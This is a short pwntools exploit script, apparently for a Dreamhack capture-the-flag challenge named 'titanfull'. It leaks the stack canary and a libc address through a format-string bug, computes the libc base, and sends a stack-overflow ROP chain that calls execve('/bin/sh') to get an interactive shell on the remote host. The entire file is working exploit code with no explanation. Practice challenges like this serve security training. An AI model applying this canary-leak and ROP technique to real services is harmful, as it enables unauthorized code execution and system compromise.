from pwn import *

if(args['REMOTE'] == '1'):
    r = remote('host3.dreamhack.games', 19956)
    libc = ELF('./libc-2.31.so')
    rop = ROP('./libc-2.31.so')

else:
    r = process('titanfull')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    rop = ROP('/lib/x86_64-linux-gnu/libc.so.6')
    gdb.attach(r, 'b*main+196\nb*vanguard+75\nc')

r.sendafter(b'What your name pilot? > ', b'%17$p %21$p') #canary = 17; libc_main_start_ret = 21
r.recvuntil(b'hello, ')

canary = int(r.recvuntil(b' ')[:-1], 16)
libc_leak = int(r.recv(14), 16)
libc.address = libc_leak - libc.symbols['__libc_start_main']     - 0xf3 #local = + 48 
log.info(f'libc base = {hex(libc.address)}')
log.info(f'canary = {hex(canary)}')

r.sendlineafter(b'> ', b'7274')

payload = b''
payload += b'A'*24
payload += p64(canary)
payload += b'B'*8
payload += p64(libc.address + rop.rsi.address)
payload += p64(0x0)
payload += p64(libc.address + rop.rdx.address)
payload += p64(0x0)
payload += p64(libc.address + rop.rdi.address)
payload += p64(list(libc.search(b'/bin/sh\x00'))[0])
payload += p64(libc.symbols['execve'])

r.sendlineafter(b'Please enter the name of titan : ', payload)

r.interactive()